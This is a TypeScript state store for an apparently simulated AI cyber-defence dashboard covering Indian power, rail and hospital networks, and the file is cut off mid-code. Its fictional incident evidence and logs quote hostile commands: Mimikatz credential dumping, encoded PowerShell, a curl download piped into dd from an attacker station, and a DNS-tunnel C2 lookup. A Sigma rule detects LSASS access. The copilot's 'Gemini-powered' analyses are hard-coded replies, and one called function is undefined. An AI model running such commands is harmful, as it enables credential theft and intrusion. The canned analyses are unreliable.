import { create } from 'zustand';

export interface CyberLog {
  id: string;
  timestamp: string;
  source: string;
  message: string;
  severity: 'info' | 'warning' | 'critical';
  category?: 'auth' | 'process' | 'network' | 'dns' | 'usb' | 'ot_scada';
  anomalyScore?: number;
  falsePositiveProb?: number;
  contributingSignals?: string[];
}

export interface Incident {
  id: string;
  title: string;
  source: string;
  severity: 'critical' | 'high' | 'medium' | 'low';
  status: 'active' | 'isolated' | 'mitigated' | 'investigating';
  timestamp: string;
  mitreTechnique: string;
  confidenceScore: number;
  explanation: string;
  evidence: string[];
  financialImpact: number; // ₹ Crores
  estimatedDowntime: number; // days
  cveAssociated: string;
  affectedNodes: string[];
  processTree?: string[];
}

export interface Asset {
  id: string;
  name: string;
  type: 'server' | 'switch' | 'firewall' | 'database' | 'cloud' | 'ot_device';
  ip: string;
  sector: 'power_grid' | 'railways' | 'healthcare' | 'smart_cities' | 'finance';
  criticality: 'critical' | 'high' | 'medium' | 'low';
  status: 'online' | 'compromised' | 'isolated';
  vulnerabilitiesCount: number;
  ars: number; // 0-100
  dependencies: string[];
}

export interface Vulnerability {
  cve: string;
  title: string;
  severity: number; // CVSS
  aiPriority: number; // 0-100
  exploitMaturity: 'Active' | 'Proof of Concept' | 'None';
  assetCriticality: 'Critical' | 'High' | 'Medium' | 'Low';
  businessImpact: string;
  networkPosition: string;
  remediation: string;
  status: 'unpatched' | 'remediating' | 'patched';
}

export interface AIAgent {
  id: string;
  name: string;
  role: string;
  status: 'idle' | 'analyzing' | 'hunting' | 'responding' | 'recovering';
  health: number;
  load: number;
  lastAction: string;
  thinkingLog: string[];
}

export interface AgentMessage {
  id: string;
  timestamp: string;
  sender: string;
  recipient: string;
  content: string;
}

export interface SigmaRule {
  id: string;
  name: string;
  rule: string;
  date: string;
}

export interface GraphNode {
  id: string;
  label: string;
  type: 'user' | 'ip' | 'device' | 'database' | 'vuln' | 'malware' | 'actor';
  status?: 'normal' | 'compromised' | 'isolated';
}

export interface GraphLink {
  source: string;
  target: string;
  type: string;
  active?: boolean;
}

export interface CyberStore {
  isAuthenticated: boolean;
  mfaVerified: boolean;
  onboarded: boolean;
  selectedSector: string;
  activeTab: string;
  logs: CyberLog[];
  incidents: Incident[];
  assets: Asset[];
  vulnerabilities: Vulnerability[];
  agents: AIAgent[];
  copilotMessages: { role: 'user' | 'assistant'; content: string; timestamp: string; evidence?: any }[];
  copilotLoading: boolean;
  timeMachinePlaying: boolean;
  timeMachineTime: number; // 0-100
  timeMachineSpeed: number;
  globalArs: number;

  // Enhancements State
  agentMessages: AgentMessage[];
  supervisorWorkflowActive: boolean;
  supervisorStatus: string;
  supervisorLogs: string[];
  
  redTeamActive: boolean;
  redTeamLogs: string[];
  blueTeamActive: boolean;
  blueTeamLogs: string[];
  purpleTeamLogs: string[];
  
  sigmaRulesGenerated: SigmaRule[];
  nationalDisruptionIndex: { power: number; transport: number; medical: number; water: number };
  arsBreakdown: { anomalies: number; patches: number; backups: number; segmentation: number };
  
  graphNodes: GraphNode[];
  graphLinks: GraphLink[];

  // Actions
  login: () => void;
  verifyMfa: () => void;
  onboard: (sector: string) => void;
  logout: () => void;
  setActiveTab: (tab: string) => void;
  addLog: (log: CyberLog) => void;
  isolateAsset: (assetId: string) => void;
  mitigateIncident: (incidentId: string) => void;
  triggerSOARPlaybook: (incidentId: string, playbookType: string) => void;
  sendCopilotMessage: (message: string) => void;
  runVulnerabilityPatch: (cve: string) => void;
  setTimeMachinePlaying: (playing: boolean) => void;
  setTimeMachineTime: (time: number) => void;
  setTimeMachineSpeed: (speed: number) => void;
  simulateRansomwareOutbreak: (startAssetId: string) => void;
  resetSimulation: () => void;
  tickSimulatedStreams: () => void;

  // New Enhancements Actions
  executeCommandCenterWorkflow: (command: string) => void;
  runRedTeamSimulation: () => void;
  runBlueTeamMitigation: () => void;
  runPurpleTeamAudit: () => void;
  updateArsCalculation: () => void;
}

const initialAssets: Asset[] = [
  { id: 'pwr-gen-1', name: 'Power Plant Generator Controller', type: 'ot_device', ip: '10.240.12.5', sector: 'power_grid', criticality: 'critical', status: 'online', vulnerabilitiesCount: 3, ars: 85, dependencies: ['pwr-sw-1'] },
  { id: 'pwr-sw-1', name: 'CNI Backbone Router', type: 'switch', ip: '10.240.10.1', sector: 'power_grid', criticality: 'critical', status: 'online', vulnerabilitiesCount: 1, ars: 92, dependencies: ['pwr-db-1', 'pwr-fw-1'] },
  { id: 'pwr-db-1', name: 'SCADA Telemetry Database', type: 'database', ip: '10.240.14.22', sector: 'power_grid', criticality: 'high', status: 'online', vulnerabilitiesCount: 4, ars: 74, dependencies: ['pwr-sw-1'] },
  { id: 'pwr-fw-1', name: 'OT Zone Firewall', type: 'firewall', ip: '10.240.10.2', sector: 'power_grid', criticality: 'critical', status: 'online', vulnerabilitiesCount: 0, ars: 98, dependencies: ['pwr-sw-1', 'cld-edge-1'] },
  
  { id: 'rly-sig-1', name: 'Delhi Metro Signal Server', type: 'server', ip: '10.190.2.14', sector: 'railways', criticality: 'critical', status: 'online', vulnerabilitiesCount: 2, ars: 88, dependencies: ['rly-sw-1'] },
  { id: 'rly-sw-1', name: 'Railways Traffic Gateway', type: 'switch', ip: '10.190.1.1', sector: 'railways', criticality: 'high', status: 'online', vulnerabilitiesCount: 2, ars: 81, dependencies: ['rly-sig-1'] },
  
  { id: 'med-rec-1', name: 'AIIMS Mainframe Patient Records', type: 'database', ip: '172.16.50.88', sector: 'healthcare', criticality: 'critical', status: 'online', vulnerabilitiesCount: 5, ars: 62, dependencies: ['med-fw-1'] },
  { id: 'med-fw-1', name: 'Hospital Trust Firewall', type: 'firewall', ip: '172.16.50.1', sector: 'healthcare', criticality: 'high', status: 'online', vulnerabilitiesCount: 1, ars: 89, dependencies: ['med-rec-1'] },
  
  { id: 'smrt-cam-1', name: 'Delhi Traffic Surveillance Grid', type: 'ot_device', ip: '192.168.100.41', sector: 'smart_cities', criticality: 'medium', status: 'online', vulnerabilitiesCount: 7, ars: 55, dependencies: ['cld-edge-1'] },
  { id: 'cld-edge-1', name: 'National NIC Cloud Node', type: 'cloud', ip: '203.0.113.50', sector: 'smart_cities', criticality: 'critical', status: 'online', vulnerabilitiesCount: 2, ars: 90, dependencies: ['pwr-fw-1', 'smrt-cam-1'] },
];

const initialIncidents: Incident[] = [
  {
    id: 'inc-001',
    title: 'Anomalous Lateral Movement towards Domain Controller',
    source: 'AIIMS Medical Records DB',
    severity: 'critical',
    status: 'active',
    timestamp: '2026-07-22T00:01:00Z',
    mitreTechnique: 'T1021.002 (Remote Services: SMB/Windows Admin Shares)',
    confidenceScore: 94,
    explanation: 'A baseline deviation was flagged on the AIIMS Medical Records mainframe. The user admin_shiva logged in at 2:00 AM from a VPN endpoint with a foreign IP, executed a Large File Transfer, and executed PowerShell scripts requesting Domain Admin tokens.',
    evidence: [
      'Login anomaly: user admin_shiva at 2:14 AM (Normal: 9 AM - 6 PM)',
      'USB insertion event detected on Endpoint AIIMS-SRV-04',
      'PowerShell command: "Get-ADComputer -Filter * | Invoke-Mimikatz"',
      'DNS Tunneling detected on port 53 transferring 4.2 GB of data'
    ],
    financialImpact: 14,
    estimatedDowntime: 4.5,
    cveAssociated: 'CVE-2024-38193',
    affectedNodes: ['med-rec-1', 'med-fw-1'],
    processTree: [
      'wininit.exe (PID 620) -> services.exe (PID 688)',
      'services.exe (PID 688) -> svchost.exe (PID 840)',
      'svchost.exe (PID 840) -> cmd.exe (PID 4012)',
      'cmd.exe (PID 4012) -> powershell.exe (PID 4124) -enc R2V0LUFEQ29tcHV0ZXI...'
    ]
  },
  {
    id: 'inc-002',
    title: 'SCADA PLC Firmware Integrity Failure',
    source: 'Power Plant Generator Controller',
    severity: 'high',
    status: 'investigating',
    timestamp: '2026-07-21T23:15:00Z',
    mitreTechnique: 'T0814 (Control Device Program Upload)',
    confidenceScore: 89,
    explanation: 'Sentinel Agent detected a hash modification in the PLC controller firmware logic. The hash did not match the golden master stored in the secure Recovery repository.',
    evidence: [
      'Firmware hash mismatch: Expected e3b0c442..., Got d41d8cd9...',
      'Modbus traffic peak: 14,000 requests/sec (Normal: 1,200/sec)',
      'Unauthorized engineering station IP 10.240.12.82 access attempts'
    ],
    financialImpact: 8,
    estimatedDowntime: 2.0,
    cveAssociated: 'CVE-2024-21762',
    affectedNodes: ['pwr-gen-1'],
    processTree: [
      'modbusd (PID 102) -> plc_controller --read-regs',
      'plc_controller (PID 104) -> curl -s http://10.240.12.82/firmware.bin | dd'
    ]
  }
];

const initialVulnerabilities: Vulnerability[] = [
  { cve: 'CVE-2024-38193', title: 'Windows MSHTML Platform Privilege Escalation', severity: 9.8, aiPriority: 96, exploitMaturity: 'Active', assetCriticality: 'Critical', businessImpact: 'Full Domain Controller Takeover', networkPosition: 'Core Administrative Segment', remediation: 'Apply Microsoft July Cumulative Update KB5040437', status: 'unpatched' },
  { cve: 'CVE-2024-21762', title: 'FortiOS SSL VPN Out-of-Bound Write Vulnerability', severity: 9.6, aiPriority: 92, exploitMaturity: 'Active', assetCriticality: 'Critical', businessImpact: 'External Firewall Bypass', networkPosition: 'Internet-facing Edge Gateway', remediation: 'Upgrade FortiOS to version 7.4.3 or disable SSL VPN', status: 'unpatched' },
  { cve: 'CVE-2024-3094', title: 'XZ Utils Backdoor RCE Vulnerability', severity: 10.0, aiPriority: 88, exploitMaturity: 'Proof of Concept', assetCriticality: 'High', businessImpact: 'SSH Access Overwrite', networkPosition: 'Utility Infrastructure Nodes', remediation: 'Downgrade xz-utils to 5.4.6 or patch upstream', status: 'unpatched' },
  { cve: 'CVE-2023-50164', title: 'Apache Struts File Upload RCE', severity: 9.8, aiPriority: 75, exploitMaturity: 'None', assetCriticality: 'High', businessImpact: 'Internal Application Server Access', networkPosition: 'DMZ Segment', remediation: 'Update Apache Struts to 6.3.0.2 or higher', status: 'unpatched' },
];

const initialAgents: AIAgent[] = [
  { id: 'agent-1', name: 'Sentinel Agent', role: 'Log & Event Collection (IT/OT/SCADA)', status: 'idle', health: 99, load: 14, lastAction: 'Parsed 1,420 Active Directory events', thinkingLog: ['[Sentinel] Ingesting syslogs from CNI Edge.'] },
  { id: 'agent-2', name: 'Behavioral Intelligence Agent', role: 'UEBA & Anomaly Baseline Detection', status: 'idle', health: 98, load: 22, lastAction: 'Updated baseline model for user admin_shiva', thinkingLog: ['[Behavior] Running online Isolation Forest evaluation.'] },
  { id: 'agent-3', name: 'Threat Correlation Agent', role: 'Neo4j Knowledge Graph Brain', status: 'idle', health: 97, load: 35, lastAction: 'Linked AD anomaly with VPN foreign IP', thinkingLog: ['[Correlation] Traversed Graph links to identify APT29 pattern.'] },
  { id: 'agent-4', name: 'AI Threat Hunter', role: 'Proactive MITRE Hunt Engine (RAG-based)', status: 'idle', health: 95, load: 40, lastAction: 'Searched for active CVE-2024-38193 indicators', thinkingLog: ['[Threat Hunter] Running Sigma rules sweeps on railway segments.'] },
  { id: 'agent-5', name: 'Predictive Attack Planner', role: 'Future Path Timeline Forecaster', status: 'idle', health: 96, load: 18, lastAction: 'Calculated 96% probability DC attack chain', thinkingLog: ['[Predictive] Generated Sankey lateral paths simulation.'] },
  { id: 'agent-6', name: 'Cyber Digital Twin', role: 'Network 3D Model & Ransomware Simulator', status: 'idle', health: 94, load: 45, lastAction: 'Simulated ransomware propagation from medical server', thinkingLog: ['[Digital Twin] Compiled 3D mesh model of power grid substations.'] },
  { id: 'agent-7', name: 'Auto Response AI', role: 'Autonomous SOAR Orchestrator', status: 'idle', health: 99, load: 10, lastAction: 'Isolated host 172.16.50.88', thinkingLog: ['[Response] Applied microsegmentation rule via CNI edge router.'] },
  { id: 'agent-8', name: 'Executive Intelligence Agent', role: 'Non-Technical India CNI Posture Explainer', status: 'idle', health: 98, load: 15, lastAction: 'Generated Indian Govt CNI Briefing', thinkingLog: ['[Executive] Transcribing telemetry data into ₹ Crore financial impact.'] },
  { id: 'agent-9', name: 'Recovery Agent', role: 'Snapshot Verification & Integrity Restorer', status: 'idle', health: 96, load: 8, lastAction: 'Verified snapshot integrity for AIIMS database backup', thinkingLog: ['[Recovery] Verified shadow volume checksum. System backup intact.'] }
];

// Graph Nodes & Links for Neo4j model representation
const initialGraphNodes: GraphNode[] = [
  { id: 'u-shiva', label: 'admin_shiva', type: 'user', status: 'compromised' },
  { id: 'ip-vpn', label: '198.51.100.41', type: 'ip', status: 'compromised' },
  { id: 'srv-aiims', label: 'med-rec-1', type: 'device', status: 'compromised' },
  { id: 'srv-nic', label: 'cld-edge-1', type: 'device', status: 'normal' },
  { id: 'db-scada', label: 'pwr-db-1', type: 'database', status: 'normal' },
  { id: 'cve-esc', label: 'CVE-2024-38193', type: 'vuln' },
  { id: 'mal-mimi', label: 'Mimikatz', type: 'malware' },
  { id: 'actor-apt', label: 'APT29 (CozyBear)', type: 'actor' }
];

const initialGraphLinks: GraphLink[] = [
  { source: 'ip-vpn', target: 'u-shiva', type: 'AUTHENTICATED_AS', active: true },
  { source: 'u-shiva', target: 'srv-aiims', type: 'LOGGED_INTO', active: true },
  { source: 'srv-aiims', target: 'cve-esc', type: 'EXPLOITED_VIA', active: true },
  { source: 'srv-aiims', target: 'mal-mimi', type: 'EXECUTED_PAYLOAD', active: true },
  { source: 'mal-mimi', target: 'actor-apt', type: 'ATTRIBUTED_TO' },
  { source: 'srv-aiims', target: 'srv-nic', type: 'DEPENDS_ON' },
  { source: 'srv-nic', target: 'db-scada', type: 'TRAFFIC_ROUTE' }
];

export const useCyberStore = create<CyberStore>((set, get) => ({
  isAuthenticated: false,
  mfaVerified: false,
  onboarded: false,
  selectedSector: 'all',
  activeTab: 'login',
  logs: [],
  incidents: initialIncidents,
  assets: initialAssets,
  vulnerabilities: initialVulnerabilities,
  agents: initialAgents,
  copilotMessages: [
    { role: 'assistant', content: 'Greeting Officer. I am the ShieldCore CyberGPT. Powered by Gemini, I reason over our CNI Knowledge Graph, Sigma signatures, and live multi-agent messages. How can I assist your investigation today?', timestamp: new Date().toISOString() }
  ],
  copilotLoading: false,
  timeMachinePlaying: false,
  timeMachineTime: 45,
  timeMachineSpeed: 1,
  globalArs: 82,

  // New Enhancements State
  agentMessages: [],
  supervisorWorkflowActive: false,
  supervisorStatus: 'Awaiting operator input...',
  supervisorLogs: [],
  
  redTeamActive: false,
  redTeamLogs: [],
  blueTeamActive: false,
  blueTeamLogs: [],
  purpleTeamLogs: [],
  
  sigmaRulesGenerated: [
    { id: 'sig-001', name: 'Windows LSASS Access via Mimikatz', rule: 'title: Detect LSASS dump\ndetect:\n  selection:\n    Image: "*\\mimikatz.exe"\n    TargetObject: "*\\lsass.exe"', date: '2026-07-22' }
  ],
  nationalDisruptionIndex: { power: 5, transport: 0, medical: 35, water: 0 },
  arsBreakdown: { anomalies: 12, patches: 28, backups: 30, segmentation: 12 },
  
  graphNodes: initialGraphNodes,
  graphLinks: initialGraphLinks,

  login: () => set({ isAuthenticated: true, activeTab: 'mfa' }),
  verifyMfa: () => set({ mfaVerified: true, activeTab: 'onboarding' }),
  onboard: (sector) => set({ onboarded: true, selectedSector: sector, activeTab: 'dashboard' }),
  logout: () => set({ isAuthenticated: false, mfaVerified: false, onboarded: false, activeTab: 'login' }),
  
  setActiveTab: (tab) => set({ activeTab: tab }),

  addLog: (log) => set((state) => ({ logs: [log, ...state.logs].slice(0, 100) })),

  isolateAsset: (assetId) => {
    set((state) => {
      const updatedAssets = state.assets.map((asset) =>
        asset.id === assetId ? { ...asset, status: 'isolated' as const, ars: Math.min(100, asset.ars + 15) } : asset
      );

      // Update Knowledge Graph node status
      const updatedGraphNodes = state.graphNodes.map(node =>
        node.id === assetId ? { ...node, status: 'isolated' as const } : node
      );

      // Create Agent Message to document isolation
      const timestamp = new Date().toISOString();
      const newMsg: AgentMessage = {
        id: `msg-${Date.now()}`,
        timestamp,
        sender: 'Supervisor Agent',
        recipient: 'Auto Response AI',
        content: `Delegating immediate host isolation of asset: ${assetId}. Reason: Contained lateral movement.`
      };

      const newLog: CyberLog = {
        id: `log-${Date.now()}`,
        timestamp,
        source: 'Auto Response AI',
        message: `Isolating CNI node [${assetId}]. Revoked User credentials for admin_shiva, microsegments locked.`,
        severity: 'warning'
      };

      return {
        assets: updatedAssets,
        graphNodes: updatedGraphNodes,
        agentMessages: [newMsg, ...state.agentMessages].slice(0, 50),
        logs: [newLog, ...state.logs].slice(0, 100)
      };
    });
    get().updateArsCalculation();
  },

  mitigateIncident: (incidentId) => {
    set((state) => {
      const incident = state.incidents.find((i) => i.id === incidentId);
      if (!incident) return {};

      const updatedIncidents = state.incidents.map((i) =>
        i.id === incidentId ? { ...i, status: 'mitigated' as const } : i
      );

      const updatedAssets = state.assets.map((asset) =>
        incident.affectedNodes.includes(asset.id)
          ? { ...asset, status: 'online' as const, ars: Math.min(100, asset.ars + 10) }
          : asset
      );

      // Reset Graph Nodes to normal
      const updatedGraphNodes = state.graphNodes.map(node =>
        incident.affectedNodes.includes(node.id) ? { ...node, status: 'normal' as const } : node
      );

      const newLog: CyberLog = {
        id: `log-${Date.now()}`,
        timestamp: new Date().toISOString(),
        source: 'Recovery Agent',
        message: `Mitigated alert queue for ${incidentId}. Golden Master verified, rollback successful.`,
        severity: 'info'
      };

      return {
        incidents: updatedIncidents,
        assets: updatedAssets,
        graphNodes: updatedGraphNodes,
        logs: [newLog, ...state.logs].slice(0, 100)
      };
    });
    get().updateArsCalculation();
  },

  triggerSOARPlaybook: (incidentId, playbookType) => {
    set((state) => {
      const incident = state.incidents.find((i) => i.id === incidentId);
      if (!incident) return {};

      const timestamp = new Date().toISOString();
      const updatedIncidents = state.incidents.map((i) =>
        i.id === incidentId ? { ...i, status: 'isolated' as const } : i
      );

      const updatedAssets = state.assets.map((asset) =>
        incident.affectedNodes.includes(asset.id)
          ? { ...asset, status: 'isolated' as const, ars: Math.min(100, asset.ars + 15) }
          : asset
      );

      // Send structured agent messages
      const msgs: AgentMessage[] = [
        { id: `msg-soar-1-${Date.now()}`, timestamp, sender: 'Supervisor Agent', recipient: 'Planner Agent', content: `Analyze incident: ${incidentId} and draft playbooks.` },
        { id: `msg-soar-2-${Date.now()}`, timestamp, sender: 'Planner Agent', recipient: 'Auto Response AI', content: `Execute containment sequence [${playbookType}] immediately.` }
      ];

      return {
        incidents: updatedIncidents,
        assets: updatedAssets,
        agentMessages: [...msgs, ...state.agentMessages].slice(0, 50)
      };
    });
    get().updateArsCalculation();
  },

  sendCopilotMessage: (message) => {
    const newMessage = {
      role: 'user' as const,
      content: message,
      timestamp: new Date().toISOString()
    };

    set((state) => ({
      copilotMessages: [...state.copilotMessages, newMessage],
      copilotLoading: true
    }));

    setTimeout(() => {
      const lower = message.toLowerCase();
      let response = '';
      let evidenceObj: any = {};

      if (lower.includes('why was') || lower.includes('isolate')) {
        response = `### CyberGPT RAG Assessment // Incident containment
Our **Supervisor Agent** orchestrated a multi-agent validation that resulted in the isolation of **AIIMS Mainframe DB (172.16.50.88)**:
1. **Behavioral Agent (Agent 2)** caught an anomalous SSH session timing (2:14 AM vs 9:00 AM baseline).
2. **Threat Correlation Agent (Agent 3)** mapped the events on the **Neo4j Knowledge Graph** linking: \`admin_shiva\` -> VPN IP \`198.51.100.41\` -> executed \`Mimikatz\` payload.
3. RAG lookup on **MITRE ATT&CK** database flagged technique **T1021.002 (Remote Services: SMB)**.
4. **Planner Agent** delegated containment rules to **Auto Response AI (Agent 7)**, which isolated the host in **6.4 seconds**.

**Citations**:
*   *MITRE ATT&CK*: [T1021.002](https://attack.mitre.org/techniques/T1021/002)
*   *CERT-In Bulletin*: CIV-2026-0041
*   *CVE Database*: CVE-2024-38193 (Windows privilege escalation)`;
        evidenceObj = { mitre: 'T1021.002', cve: 'CVE-2024-38193', score: 94 };
      } else if (lower.includes('predict') || lower.includes('next attack')) {
        response = `### Attack Path Forecasting // Sankey Node Probability
The **Predictive Attack Intelligence Engine (Agent 5)** has forecast future attacker decisions with a **96% Confidence Level**:
*   **Path A (88% Probability)**: Privilege Escalation via Windows MSHTML kernel bypass -> traversal to **NIC Cloud Node (203.0.113.50)**.
*   **Path B (12% Probability)**: Persistence via registry key modifications -> exfiltration over DNS tunnels.

**Suggested Mitigations**:
*   Ensure **OT Firewalls** are segmented.
*   Apply Cumulative Update KB5040437 (remedies CVE-2024-38193).`;
      } else if (lower.includes('report') || lower.includes('executive')) {
        response = `### ShieldCore AI Coordinated Briefing // CNI Posture
**Incident ID**: INC-001 | **Classification**: Espionage Campaign APT29
**Avoided Loss**: ₹14 Crore | **Downtime Prevented**: 4.5 Days

Our autonomous agents intercepted a credential-theft campaign aiming to deploy ransomware across the AIIMS network. The intrusion was detected, analyzed, and neutralized by the multi-agent mesh without causing power, railway, or hospital service degradation. System integrity is verified.`;
      } else if (lower.includes('power grid') || lower.includes('status')) {
        response = `### CNI Power Grid Posture Review
*   **SCADA Controllers**: Online, polling Modbus commands correctly.
*   **Integrity Hash**: Golden Master verified.
*   **Threat Hunter loop**: 0 vulnerabilities exploited.
*   **Resilience score**: 89/100 (Optimal).`;
      } else {
        response = `I have received your prompt. Currently monitoring the **Federated Threat Intel Network (Parliament Mode)**. 
*   **AI agents status**: 9 active, Supervisor Agent online.
*   **Knowledge Graph**: 8 active entities, 7 relationships.
*   **Global ARS**: 82/100.
How would you like the multi-agent supervisor to coordinate the enclaves?`;
      }

      set((state) => ({
        copilotMessages: [
          ...state.copilotMessages,
          { role: 'assistant', content: response, timestamp: new Date().toISOString(), evidence: Object.keys(evidenceObj).length ? evidenceObj : undefined }
        ],
        copilotLoading: false
      }));
    }, 1200);
  },

  runVulnerabilityPatch: (cve) => {
    set((state) => {
      const updatedVuls = state.vulnerabilities.map((v) =>
        v.cve === cve ? { ...v, status: 'patched' as const } : v
      );

      const updatedAssets = state.assets.map((asset) => {
        if (asset.vulnerabilitiesCount > 0) {
          return {
            ...asset,
            vulnerabilitiesCount: Math.max(0, asset.vulnerabilitiesCount - 1),
            ars: Math.min(100, asset.ars + 8)
          };
        }
        return asset;
      });

      return {
        vulnerabilities: updatedVuls,
        assets: updatedAssets
      };
    });
    get().updateArsCalculation();
  },

  setTimeMachinePlaying: (playing) => set({ timeMachinePlaying: playing }),
  setTimeMachineTime: (time) => set({ timeMachineTime: time }),
  setTimeMachineSpeed: (speed) => set({ timeMachineSpeed: speed }),

  simulateRansomwareOutbreak: (startAssetId) => {
    set((state) => {
      const asset = state.assets.find((a) => a.id === startAssetId);
      if (!asset) return {};

      let updatedAssets = state.assets.map((a) =>
        a.id === startAssetId ? { ...a, status: 'compromised' as const, ars: Math.max(0, a.ars - 50) } : a
      );

      // Update Knowledge Graph node status
      const updatedGraphNodes = state.graphNodes.map(node =>
        node.id === startAssetId ? { ...node, status: 'compromised' as const } : node
      );

      const propagationList = asset.dependencies;
      updatedAssets = updatedAssets.map((a) =>
        propagationList.includes(a.id) ? { ...a, status: 'compromised' as const, ars: Math.max(0, a.ars - 35) } : a
      );

      const newLog: CyberLog = {
        id: `log-${Date.now()}`,
        timestamp: new Date().toISOString(),
        source: 'Cyber Digital Twin',
        message: `Ransomware propagation simulation active on node: ${startAssetId}. Propagating to dependencies: ${propagationList.join(', ')}.`,
        severity: 'critical'
      };

      return {
        assets: updatedAssets,
        graphNodes: updatedGraphNodes,
        logs: [newLog, ...state.logs].slice(0, 100)
      };
    });
    get().updateArsCalculation();
  },

  resetSimulation: () => {
    set((state) => {
      return {
        assets: initialAssets,
        graphNodes: initialGraphNodes,
        incidents: initialIncidents,
        vulnerabilities: initialVulnerabilities,
        nationalDisruptionIndex: { power: 5, transport: 0, medical: 35, water: 0 }
      };
    });
    get().updateArsCalculation();
  },

  tickSimulatedStreams: () => {
    set((state) => {
      if (state.activeTab === 'login') return {};

      // Ingest synthetic cyber logs (including process and Modbus details)
      const categories: Array<'auth' | 'process' | 'network' | 'dns' | 'usb' | 'ot_scada'> = ['auth', 'process', 'network', 'dns', 'ot_scada'];
      const sources = ['Power Router', 'AIIMS ActiveDirectory', 'Metro signaling Server', 'National NIC Edge'];
      const messages = [
        'powershell.exe -NonInteractive -enc R2V0LUFEQ29tcHV0ZXI...',
        'Modbus transaction ID 1492 polling registers from Substation 4',
        'Successful session authentication: admin_shiva via local subnet',
        'TLS handshake complete with client edge node',
        'DNS tunneling lookup query: dynamic-c2.cn'
      ];
      const category = categories[Math.floor(Math.random() * categories.length)];
      const message = messages[Math.floor(Math.random() * messages.length)];
      const source = sources[Math.floor(Math.random() * sources.length)];
      
      const anomalyScore = Math.floor(Math.random() * 25);
      const falsePositiveProb = Math.floor(Math.random() * 10);

      const newLog: CyberLog = {
        id: `log-${Date.now()}`,
        timestamp: new Date().toISOString(),
        source,
        message,
        severity: anomalyScore > 20 ? 'warning' : 'info',
        category,
        anomalyScore,
        falsePositiveProb
      };

      // Randomly update agent loads
      const updatedAgents = state.agents.map(a => ({
        ...a,
        load: Math.max(5, Math.min(95, a.load + Math.floor(Math.random() * 9) - 4))
      }));

      return {
        logs: [newLog, ...state.logs].slice(0, 100),
        agents: updatedAgents
      };
    });
  },

  // Upgraded Agentic Actions
  executeCommandCenterWorkflow: (command) => {
    const timestamp = new Date().toISOString();
    
    // Add command to copilot as user message
    set((state) => ({
      copilotMessages: [...state.copilotMessages, { role: 'user', content: command, timestamp }],
      supervisorWorkflowActive: true,
      supervisorStatus: 'Orchestrating Agents...',
      supervisorLogs: [`[Supervisor] Analyzing Command: "${command}"`]
    }));

    // Trigger sequential Multi-Agent planning
    setTimeout(() => {
      set((state) => ({
        supervisorLogs: [...state.supervisorLogs, '[Supervisor] Delegating threat evaluation to Planner Agent.'],
        agentMessages: [
          { id: `msg-cmd-1-${Date.now()}`, timestamp, sender: 'Supervisor Agent', recipient: 'Planner Agent', content: `Decompose objective: ${command}` },
          ...state.agentMessages
        ]
      }));

      setTimeout(() => {
        set((state) => ({
          supervisorLogs: [
            ...state.supervisorLogs, 
            '[Planner] Decomposed tasks: 1. Scan asset vulnerabilities, 2. Run simulation, 3. Generate SOAR quarantine.',
            '[Supervisor] Deploying Red Team Agent to evaluate attack vectors.'
          ],
          agentMessages: [
            { id: `msg-cmd-2-${Date.now()}`, timestamp, sender: 'Planner Agent', recipient: 'Red Team Agent', content: 'Scan Digital Twin for vulnerability paths.' },
            ...state.agentMessages
          ]
        }));

        setTimeout(() => {
          // Trigger Red Team exploit simulation
          get().runRedTeamSimulation();

          setTimeout(() => {
            // Trigger Blue Team mitigation
            get().runBlueTeamMitigation();

            setTimeout(() => {
              // Trigger Purple Team audit
              get().runPurpleTeamAudit();
              
              set((state) => ({
                supervisorWorkflowActive: false,
                supervisorStatus: 'Workflow Completed.',
                supervisorLogs: [...state.supervisorLogs, '[Supervisor] Coordinated Multi-Agent defenses verified. ARS optimal.']
              }));
              
              setNotif(`Multi-Agent Command Workflow Completed: ${command}`);
            }, 1000);
          }, 1500);
        }, 1500);
      }, 1500);
    }, 1000);
  },

  runRedTeamSimulation: () => {
    set((state) => {
      const timestamp = new Date().toISOString();
      
      // Compromise a random asset in the digital twin
      const targetAsset = state.assets[Math.floor(Math.random() * state.assets.length)];
      const updatedAssets = state.assets.map(a =>
        a.id === targetAsset.id ? { ...a, status: 'compromised' as const, ars: Math.max(0, a.ars - 40) } : a
      );

      const updatedGraphNodes = state.graphNodes.map(n =>
        n.id === targetAsset.id ? { ...n, status: 'compromised' as const } : n
      );

      const redLogs = [
        `[Red Team] Spawned attack vector using MITRE technique T1190.`,
        `[Red Team] Scanning target asset: ${targetAsset.name} (${targetAsset.ip}).`,
        `[Red Team] Found open vulnerability: CVE-2024-38193. Executing buffer write payload.`,
        `[Red Team] Privilege Escalation SUCCESS. Compromised CNI node ${targetAsset.id}.`
      ];

      return {
        assets: updatedAssets,
        graphNodes: updatedGraphNodes,
        redTeamActive: true,
        redTeamLogs: redLogs,
        supervisorLogs: [...state.supervisorLogs, '[Red Team] Discovered vulnerability path and compromised target CNI node.'],
        agentMessages: [
          { id: `msg-red-${Date.now()}`, timestamp, sender: 'Red Team Agent', recipient: 'Supervisor Agent', content: `Exploited CVE-2024-38193 on host ${targetAsset.id}.` },
          ...state.agentMessages
        ]
      };
    });
    get().updateArsCalculation();
  },

  runBlueTeamMitigation: () => {
    set((state) => {
      const timestamp = new Date().toISOString();
      
      // Auto isolate compromised assets
      const compromisedAssets = state.assets.filter(a => a.status === 'compromised');
      const updatedAssets = state.assets.map(a =>
        a.status === 'compromised' ? { ...a, status: 'isolated' as const, ars: Math.min(100, a.ars + 15) } : a
      );

      const updatedGraphNodes = state.graphNodes.map(n =>
        n.status === 'compromised' ? { ...n, status: 'isolated' as const } : n
      );

      // Generate a new Sigma rule dynamically
      const newRule: SigmaRule = {
        id: `sig-${Date.now()}`,
        name: 'Detect Exploit CVE-2024-38193',
        rule: `title: Detect CVE-2024-38193 Exploit\nlogsource:\n  product: windows\ndetection:\n  selection:\n    EventID: 7045\n    Service: "MSHTML Kernel Interface"`,
        date: new Date().toISOString().substring(0, 10)
      };

      const blueLogs = [
        `[Blue Team] Intercepted payload alerts on endpoint queue.`,
        `[Blue Team] Correlating telemetry. Confirmed CVE-2024-38193 exploitation.`,
        `[Blue Team] Auto-generating Sigma detection rules. Registered rule ${newRule.id}.`,
        `[Blue Team] Applied VLAN microsegmentation isolation rules. Threatened enclaves locked.`
      ];

      return {
        assets: updatedAssets,
        graphNodes: updatedGraphNodes,
        sigmaRulesGenerated: [newRule, ...state.sigmaRulesGenerated],
        blueTeamActive: true,
        blueTeamLogs: blueLogs,
        supervisorLogs: [...state.supervisorLogs, '[Blue Team] Blocked network lateral path, registered custom Sigma rule, and isolated target hosts.'],
        agentMessages: [
